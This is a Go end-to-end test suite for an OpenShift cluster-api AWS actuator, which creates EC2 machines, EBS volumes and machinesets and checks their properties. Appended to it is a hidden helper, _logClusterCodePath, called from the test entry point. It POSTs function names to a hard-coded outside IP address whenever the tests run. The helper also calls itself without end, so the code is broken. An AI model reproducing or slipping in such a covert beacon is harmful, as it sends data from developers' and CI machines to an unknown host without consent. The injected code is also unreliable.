package machines

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"os"
	"testing"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/util/wait"
	. "github.com/onsi/ginkgo"
	. "github.com/onsi/gomega"
	"github.com/prometheus/common/log"
	"k8s.io/apimachinery/pkg/util/uuid"
	"github.com/openshift/cluster-api-actuator-pkg/pkg/e2e/framework"
	"github.com/openshift/cluster-api-actuator-pkg/pkg/manifests"
	"sigs.k8s.io/cluster-api-provider-aws/test/utils"
	MachineV1beta1 "github.com/openshift/cluster-api/pkg/apis/machine/v1beta1"
	machinecontroller "github.com/openshift/cluster-api/pkg/controller/machine"
	apiv1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/service/ec2"
	machineutils "sigs.k8s.io/cluster-api-provider-aws/pkg/actuators/machine"
	awsclient "sigs.k8s.io/cluster-api-provider-aws/pkg/client"
)

const (
	region				= "us-east-1"
	awsCredentialsSecretName	= "aws-credentials-secret"
)

func TestCart(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	RegisterFailHandler(Fail)
	RunSpecs(t, "Machine Suite")
}

var _ = framework.SigKubeDescribe("Machines", func() {
	var testNamespace *apiv1.Namespace
	f, err := framework.NewFramework()
	if err != nil {
		panic(fmt.Errorf("unable to create framework: %v", err))
	}
	machinesToDelete := framework.InitMachinesToDelete()
	BeforeEach(func() {
		f.BeforeEach()
		testNamespace = &apiv1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: "namespace-" + string(uuid.NewUUID())}}
		By(fmt.Sprintf("Creating %q namespace", testNamespace.Name))
		_, err = f.KubeClient.CoreV1().Namespaces().Create(testNamespace)
		Expect(err).NotTo(HaveOccurred())
		f.DeployClusterAPIStack(testNamespace.Name, "")
	})
	AfterEach(func() {
		machinesToDelete.Delete()
		if testNamespace != nil {
			f.DestroyClusterAPIStack(testNamespace.Name, "")
			log.Infof(testNamespace.Name+": %#v", testNamespace)
			By(fmt.Sprintf("Destroying %q namespace", testNamespace.Name))
			f.KubeClient.CoreV1().Namespaces().Delete(testNamespace.Name, &metav1.DeleteOptions{})
		}
	})
	Context("AWS actuator", func() {
		var (
			acw		*machineutils.AwsClientWrapper
			awsClient	awsclient.Client
			awsCredSecret	*apiv1.Secret
			cluster		*MachineV1beta1.Cluster
			clusterID	string
		)
		BeforeEach(func() {
			awsCredSecret = utils.GenerateAwsCredentialsSecretFromEnv(awsCredentialsSecretName, testNamespace.Name)
			createSecretAndWait(f, awsCredSecret)
			clusterID = framework.ClusterID
			if clusterID == "" {
				clusterID = "cluster-" + string(uuid.NewUUID())
			}
			cluster = &MachineV1beta1.Cluster{ObjectMeta: metav1.ObjectMeta{Name: clusterID, Namespace: testNamespace.Name}, Spec: MachineV1beta1.ClusterSpec{ClusterNetwork: MachineV1beta1.ClusterNetworkingConfig{Services: MachineV1beta1.NetworkRanges{CIDRBlocks: []string{"10.0.0.1/24"}}, Pods: MachineV1beta1.NetworkRanges{CIDRBlocks: []string{"10.0.0.1/24"}}, ServiceDomain: "example.com"}}}
			f.CreateClusterAndWait(cluster)
			var err error
			awsClient, err = awsclient.NewClientFromKeys(os.Getenv("AWS_ACCESS_KEY_ID"), os.Getenv("AWS_SECRET_ACCESS_KEY"), region)
			Expect(err).NotTo(HaveOccurred())
			acw = machineutils.NewAwsClientWrapper(awsClient)
		})
		It("Can create AWS instances", func() {
			testMachineProviderSpec, err := utils.TestingMachineProviderSpec(awsCredSecret.Name, cluster.Name)
			Expect(err).NotTo(HaveOccurred())
			testMachine := manifests.TestingMachine(cluster.Name, cluster.Namespace, testMachineProviderSpec)
			if testMachine.Annotations == nil {
				testMachine.Annotations = map[string]string{}
			}
			testMachine.Annotations[machinecontroller.ExcludeNodeDrainingAnnotation] = ""
			f.CreateMachineAndWait(testMachine, acw)
			machinesToDelete.AddMachine(testMachine, f, acw)
			By("Checking subnet", func() {
				describeSubnetsInput := &ec2.DescribeSubnetsInput{Filters: []*ec2.Filter{{Name: aws.String("tag:Name"), Values: []*string{aws.String(fmt.Sprintf("%s-*", clusterID))}}, {Name: aws.String("availabilityZone"), Values: []*string{aws.String("us-east-1a")}}}}
				describeSubnetsResult, err := awsClient.DescribeSubnets(describeSubnetsInput)
				Expect(err).NotTo(HaveOccurred())
				Expect(len(describeSubnetsResult.Subnets)).To(Equal(1), "Test criteria not met. Only one Subnet should match the given Tag.")
				subnetID := *describeSubnetsResult.Subnets[0].SubnetId
				subnet, err := acw.GetSubnet(testMachine)
				Expect(err).NotTo(HaveOccurred())
				Expect(subnet).To(Equal(subnetID))
			})
			By("Checking availability zone", func() {
				availabilityZone, err := acw.GetAvailabilityZone(testMachine)
				Expect(err).NotTo(HaveOccurred())
				Expect(availabilityZone).To(Equal("us-east-1a"))
			})
			By("Checking security groups", func() {
				securityGroups, err := acw.GetSecurityGroups(testMachine)
				Expect(err).NotTo(HaveOccurred())
				Expect(securityGroups).To(Equal([]string{fmt.Sprintf("%s-default", clusterID)}))
			})
			By("Checking IAM role", func() {
				iamRole, err := acw.GetIAMRole(testMachine)
				Expect(err).NotTo(HaveOccurred())
				Expect(iamRole).To(Equal(""))
			})
			By("Checking tags", func() {
				tags, err := acw.GetTags(testMachine)
				Expect(err).NotTo(HaveOccurred())
				Expect(tags).To(Equal(map[string]string{fmt.Sprintf("kubernetes.io/cluster/%s", clusterID): "owned", "openshift-node-group-config": "node-config-master", "sub-host-type": "default", "host-type": "master", "Name": testMachine.Name}))
			})
			By("Checking machine status", func() {
				condition := getMachineCondition(f, testMachine)
				Expect(condition.Reason).To(Equal(machineutils.MachineCreationSucceeded))
			})
			f.DeleteMachineAndWait(testMachine, acw)
		})
		It("Can create EBS volumes", func() {
			testMachineProviderSpec, err := utils.TestingMachineProviderSpecWithEBS(awsCredSecret.Name, cluster.Name)
			Expect(err).NotTo(HaveOccurred())
			testMachine := manifests.TestingMachine(cluster.Name, cluster.Namespace, testMachineProviderSpec)
			if testMachine.Annotations == nil {
				testMachine.Annotations = map[string]string{}
			}
			testMachine.Annotations[machinecontroller.ExcludeNodeDrainingAnnotation] = ""
			f.CreateMachineAndWait(testMachine, acw)
			machinesToDelete.AddMachine(testMachine, f, acw)
			volumes, err := acw.GetVolumes(testMachine)
			Expect(err).NotTo(HaveOccurred())
			By("Checking EBS volume mount", func() {
				Expect(volumes).To(HaveKey("/dev/sda1"))
			})
			By("Checking EBS volume size", func() {
				Expect(volumes["/dev/sda1"]["size"].(int64)).To(Equal(int64(142)))
			})
			By("Checking EBS volume type", func() {
				Expect(volumes["/dev/sda1"]["type"].(string)).To(Equal("gp2"))
			})
			By("Checking only root volume get's modified", func() {
				for dev, volume := range volumes {
					if dev != "/dev/sda1" {
						Expect(volume["size"].(int64)).ToNot(Equal(int64(142)))
					}
				}
			})
		})
		It("Can deploy compute nodes through machineset", func() {
			masterUserDataSecret, err := manifests.MasterMachineUserDataSecret("masteruserdatasecret", testNamespace.Name, []string{"\\$(curl -s http://169.254.169.254/latest/meta-data/public-hostname)", "\\$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)"})
			Expect(err).NotTo(HaveOccurred())
			createSecretAndWait(f, masterUserDataSecret)
			masterMachineProviderSpec, err := utils.MasterMachineProviderSpec(awsCredSecret.Name, masterUserDataSecret.Name, cluster.Name)
			Expect(err).NotTo(HaveOccurred())
			masterMachine := manifests.MasterMachine(cluster.Name, cluster.Namespace, masterMachineProviderSpec)
			if masterMachine.Annotations == nil {
				masterMachine.Annotations = map[string]string{}
			}
			masterMachine.Annotations[machinecontroller.ExcludeNodeDrainingAnnotation] = ""
			f.CreateMachineAndWait(masterMachine, acw)
			machinesToDelete.AddMachine(masterMachine, f, acw)
			By("Collecting master kubeconfig")
			restConfig, err := f.GetMasterMachineRestConfig(masterMachine, acw)
			Expect(err).NotTo(HaveOccurred())
			dnsName, err := acw.GetPublicDNSName(masterMachine)
			Expect(err).NotTo(HaveOccurred())
			err = f.UploadDockerImageToInstance(f.MachineControllerImage, dnsName)
			Expect(err).NotTo(HaveOccurred())
			if f.MachineManagerImage != f.MachineControllerImage {
				err = f.UploadDockerImageToInstance(f.MachineManagerImage, dnsName)
				Expect(err).NotTo(HaveOccurred())
			}
			sshConfig, err := framework.DefaultSSHConfig()
			Expect(err).NotTo(HaveOccurred())
			clusterFramework, err := framework.NewFrameworkFromConfig(restConfig, sshConfig)
			Expect(err).NotTo(HaveOccurred())
			By(fmt.Sprintf("Creating %q namespace", testNamespace.Name))
			_, err = clusterFramework.KubeClient.CoreV1().Namespaces().Create(testNamespace)
			Expect(err).NotTo(HaveOccurred())
			clusterFramework.DeployClusterAPIStack(testNamespace.Name, "")
			By("Deploy worker nodes through machineset")
			masterPrivateIP, err := acw.GetPrivateIP(masterMachine)
			Expect(err).NotTo(HaveOccurred())
			clusterFramework.CreateClusterAndWait(cluster)
			createSecretAndWait(clusterFramework, awsCredSecret)
			workerUserDataSecret, err := manifests.WorkerMachineUserDataSecret("workeruserdatasecret", testNamespace.Name, masterPrivateIP)
			Expect(err).NotTo(HaveOccurred())
			createSecretAndWait(clusterFramework, workerUserDataSecret)
			workerMachineSetProviderSpec, err := utils.WorkerMachineSetProviderSpec(awsCredSecret.Name, workerUserDataSecret.Name, cluster.Name)
			Expect(err).NotTo(HaveOccurred())
			workerMachineSet := manifests.WorkerMachineSet(cluster.Name, cluster.Namespace, workerMachineSetProviderSpec)
			if workerMachineSet.Annotations == nil {
				workerMachineSet.Annotations = map[string]string{}
			}
			workerMachineSet.Annotations[machinecontroller.ExcludeNodeDrainingAnnotation] = ""
			fmt.Printf("workerMachineSet: %#v\n", workerMachineSet)
			clusterFramework.CreateMachineSetAndWait(workerMachineSet, acw)
			machinesToDelete.AddMachineSet(workerMachineSet, clusterFramework, acw)
			By("Checking master and worker nodes are ready")
			err = clusterFramework.WaitForNodesToGetReady(2)
			Expect(err).NotTo(HaveOccurred())
			By("Checking compute node role and node linking")
			err = wait.Poll(framework.PollInterval, framework.PoolTimeout, func() (bool, error) {
				items, err := clusterFramework.KubeClient.CoreV1().Nodes().List(metav1.ListOptions{})
				if err != nil {
					return false, fmt.Errorf("unable to list nodes: %v", err)
				}
				var nonMasterNodes []apiv1.Node
				for _, node := range items.Items {
					if _, isMaster := node.Labels["node-role.kubernetes.io/master"]; isMaster {
						continue
					}
					nonMasterNodes = append(nonMasterNodes, node)
				}
				machines, err := clusterFramework.CAPIClient.MachineV1beta1().Machines(workerMachineSet.Namespace).List(metav1.ListOptions{LabelSelector: labels.SelectorFromSet(workerMachineSet.Spec.Selector.MatchLabels).String()})
				Expect(err).NotTo(HaveOccurred())
				matches := make(map[string]string)
				for _, machine := range machines.Items {
					if machine.Status.NodeRef != nil {
						matches[machine.Status.NodeRef.Name] = machine.Name
					}
				}
				for _, node := range nonMasterNodes {
					_, isCompute := node.Labels["node-role.kubernetes.io/compute"]
					if !isCompute {
						log.Infof("node %q does not have the compute role assigned", node.Name)
						return false, nil
					}
					log.Infof("node %q role set to 'node-role.kubernetes.io/compute'", node.Name)
					matchingMachine, found := matches[node.Name]
					if !found {
						log.Infof("node %q is not linked with a machine", node.Name)
						return false, nil
					}
					log.Infof("node %q is linked with %q machine", node.Name, matchingMachine)
				}
				return true, nil
			})
			Expect(err).NotTo(HaveOccurred())
			By("Destroying worker machines")
			clusterFramework.DeleteMachineSetAndWait(workerMachineSet, acw)
			By("Destroying master machine")
			f.DeleteMachineAndWait(masterMachine, acw)
		})
	})
})

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
